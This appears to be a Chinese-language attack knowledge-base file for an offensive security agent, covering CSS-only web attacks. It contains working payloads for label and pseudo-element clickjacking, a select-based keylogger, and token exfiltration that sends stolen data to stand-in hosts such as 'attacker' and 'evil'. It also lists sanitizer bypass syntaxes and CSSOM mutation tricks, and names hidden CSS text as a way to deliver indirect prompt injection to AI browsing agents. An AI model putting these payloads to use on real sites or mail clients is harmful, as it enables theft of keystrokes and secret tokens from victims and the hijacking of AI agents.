# CSS-only 攻击专题

> 当能注入 CSS（或 HTML+CSS）但不能注入 JS 时（webmail 渲染不可信 HTML、CSP 封死 script 但留 style-src 'unsafe-inline'、净化器只过滤 JS 不过滤 CSS），用纯 CSS 完成 UI 劫持、数据外带、击键记录。
> CSS 属性选择器外带基础（trigram/unicode-range/字形宽度）见 `$AGENT_DIR/knowledge-base/client-side-attacks.md` §3，本文不重复。

---

## 1. 触发条件与前提

- 目标把用户 HTML/CSS 渲染进**可信 UI 上下文**（webmail、协作工具、评论富文本）
- 或 XSS 被 CSP/净化器挡死但 `style` 注入存活
- 检查: 提交 `<div style="color:red">test</div>` 与 `<style>*{color:red}</style>` 两个探针，看渲染后样式是否生效、生效范围是否逃出注入容器

## 2. UI 劫持（无需 JS 的点击劫持）

### 2.1 label 点击劫持

HTML label 的 `for` 属性指向任意带 id 的表单元素，点击 label 等于点击该元素（继承其 click 动作）。净化器常漏检 label/for:
```html
<label for="RibbonModeToggle">Click me first</label>
<label for="548">Click here to pin this message</label>
```
目标侦察（注入点有 JS 执行时）: `document.querySelectorAll('input[id],button[id],select[id],textarea[id]')` 列出全部可劫持元素。

### 2.2 CSS hotwiring（任意点击 → 指定 UI 动作）

`:before`/`:after` 伪元素继承宿主元素的 click 事件。给目标 UI 元素的伪元素 `position:fixed` 全屏覆盖 + `content`（**必须设 content 否则伪元素不渲染**），受害者点页面任意位置都触发该 UI 动作:
```css
.vip-button:before {
  position: fixed; width: 100%; height: 100%;
  content: " ";            /* 空格=不可见；漏 content 整个攻击失效 */
  z-index: 10000000;
}
```
多步链: 用 z-index 叠多个伪元素（先开侧栏 → 再点 VIP → 再提交），`.a:before{z-index:10000000}` `.b:before{z-index:10000001}` 逐层触发。

## 3. CSS 击键记录器

### 3.1 真相核查（先破后立）

流传的 `input[value$="a"]` 属性选择器键盘记录器**基本无效**——属性选择器匹配的是 HTML 序列化里的 `value` 属性，用户打字更新的是 DOM `value` 属性（property），二者无绑定。除非目标用 JS 框架把输入同步回属性（React 受控组件等），否则不发请求。

### 3.2 可用的 select 键盘记录器

`<select>` 的键盘交互触发 `:checked` 状态变化，纯 CSS 可感知。每个字母一个 `<option>`，`option+option:checked` 相邻兄弟选择器定位具体选项，`:has(option[label=a]:checked)` 联动动画:
```html
<style>
option+option:checked{background:url(https://attacker/?steal=a);}
option+option+option:checked{background:url(https://attacker/?steal=b);}
</style>
<select><option>.|</option><option>a*</option><option>b*</option>...</select>
```
伪装成密码框: `select{appearance:none; -webkit-text-security:disc;}`（打码圆点显示）。
实时化: select 键盘选项有 ~1s 定时器（连续选不同首字母要等待）。Firefox 中把 select 短暂移出屏幕（`@keyframes{from{left:-5000px} to{left:0}}`，duration 0.5ms）会重置该定时器 → 击键实时回传。
`:checked` 与类选择器组合被滤时用相邻兄弟绕过（`option+option:checked` 替代 `.b:checked`）。

## 4. 数据外带增补

基础属性选择器外带见 client-side-attacks.md §3。增补:

### 4.1 nesting 缩减外带体积

外 token 在 URL 中时，外层一个 `[href^="...token="]` 锚定前缀（只输出一次），嵌套 `&[href*="c2e16"]` 暴力中段——比每条规则重复前后缀省数倍 CSS:
```css
a[href^="https://site/callback?token="] {
  &[href*="en=00000"] { background:url("//evil/?start=00000"); }
  &[href*="a1781&o"]  { background:url("//evil/?end=a1781"); }
}
```
配 `:not()` 滤掉出现在 URL 后缀段的重复子串（`&[href*="e96de"]:not([href*="_e96de"])`）、CSS 变量复用（`--m0:url(...)` 多处 `var()`）进一步压缩。中段空缺字符由服务端拼接还原（已知首 5+尾 5，取任意位置 5 字符块前后缀对齐即可解出中间字符）。

### 4.2 CSP 全封外部资源时的外带（零请求直到点击）

无外部请求原语时用**字体高度 oracle + 点击链**: 数字 token 在文本节点（如 `<strong>991022</strong>`）:
1. 每数字一个 @font-face，`unicode-range` 锁单码点 + `descent-override: 200%` 放大该数字高度
2. `@keyframes` 轮播 font-family（每个数字一帧，穿插 arial 帧做延迟），`animation-play-state` 配 `if(style(--flag:"Zero"):...)` 条件暂停
3. 测总高度差 ÷ 单数字放大高度 = 各数字出现次数（`--c: calc(round((var(--h) - 108) / 28))`）
4. 生成 `<a href="//evil#0x1&1x1&2x2&9x2">` 链接（数字×频次全组合），CSS `inset:max(var(--zero1,100%), ...)` 只把正确组合的链接 `inset:0%` 全屏化，其余 100% 移出屏幕——受害者点邮件任意位置即外带

## 5. CSS 净化器绕过

### 5.1 外部请求语法全集（逐个试，净化器漏哪个用哪个）

```css
background:-webkit-image-set(url(/foo))     background:image-set('/foo')
background:0%url(/foo)                       background:calc(99% + 1%)url(/foo)
@import url(/foo)   @import "/foo";          @import /foo ;
/*# sourceMappingURL=https://evil.oastify.com */   ← <style> 内注释，解析器自动拉取
color:var(--&#0,red                            ← 实体编码的变量名（style 属性内）
```

### 5.2 语法怪癖

- 注释判定: `url(/*Not a Comment*/)`、`url('foo'/* Is a Comment*/)`、`url(aa/*Not a comment);`——**括号内外的注释语义不同**，净化器与浏览器判定可分歧
- 属性名前被忽略的字符: Firefox 忽略 `{`/`}`——`style="}color:red"` 照样生效（对抗属性名 denylist）
- hex 转义: `url(/\0a/evil)`、`url(/\D/evil)`——斜杠间转义序列浏览器解码后是换行/回车 → URL 变跨域 `//evil`，净化器以为相对路径

### 5.3 CSSOM mutation（先解析后过滤的净化器）

净化器用 CSSOM 枚举规则再序列化输出时，Chrome 读 keyframes 名/mediaText 会**解码 hex 转义**——注入的转义在序列化后变真实字符:
```css
/* 输入 */ @keyframes foo\7d\2a { color:red }
/* 序列化输出 */ @keyframes foo } * { color:red }     ← 逃出作用域选中全页面
/* 输入 */ @media s\63\72\65\65\6e\7d\2a\7b\63\6f\6c\6f\72\3a\72\65\64\7d print { ... }
```
此类 mutation 至今存于 Chrome; 防御侧修复模式是对 mediaText 做 `[^A-Za-z0-9:,.()_\-\/]` 白名单校验——见到"输出原样返回 mediaText"的实现即是缺口。

### 5.4 CSS gadgets（净化器 allowlist 之外的注入值）

可信 JS 库（如 Tabster 无障碍库）读取 allowlist 放行的 `data-*` 属性、随后向 DOM **追加**含 allowlist 外 CSS 值（`position:fixed` 等）的元素 → 攻击者用 allowlist 内属性覆盖其样式（`content-visibility` 用 `!important` 反杀库的自我保护）逃出消息窗口（全屏覆盖/defacement）。侦察: 翻目标页面 DOM 找带内联样式的动态追加节点 + allowlist 的 data-* 属性。

### 5.5 方法论（probe → inspect → transform → exploit 循环）

1. probe: 发各种语法探针
2. inspect: devtools 看哪些属性/语法存活、输出形态
3. transform: 对存活的语法做变形（转义/注释/嵌套），对比输入输出是否 mutation
4. exploit: 输出与输入语义分歧点即绕过。**记录每次输入/输出对照**——链式组合时全靠笔记

## 6. 典型受影响面速查

- Webmail（渲染不可信 HTML+CSS 于可信 UI）: label 劫持、hotwiring、select 键盘记录、image proxy 绕过（`\5c` 转义反斜杠让净化器以为相对路径、浏览器连 allowlist 域; `image-set(var(--x,'//evil'))` 变量 fallback 绕代理）
- 剪贴板 race: 复制含 `<style>*{color:red}</style>` 的页面粘贴进 webmail 富文本——Firefox 允许 inline style 存活（Chrome 重写成 style 属性、Safari 丢弃），配 CSS 外带可偷邮件里的 token 链接
- AI 浏览器/代理读邮件: `:before`/`:after` content 与 `opacity:0.00000001` 造成 LLM 与人看到的内容分歧（间接提示注入载体）

## 7. 关联文件

- `$AGENT_DIR/knowledge-base/client-side-attacks.md` §3 — CSS 外带基础（trigram/unicode-range/字形宽度/connection pool）
- `$AGENT_DIR/knowledge-base/csp-bypass.md` — CSP 绕过专题
- `$AGENT_DIR/knowledge-base/dangling-markup.md` — CSP 禁 script 允 img 时的标记外带
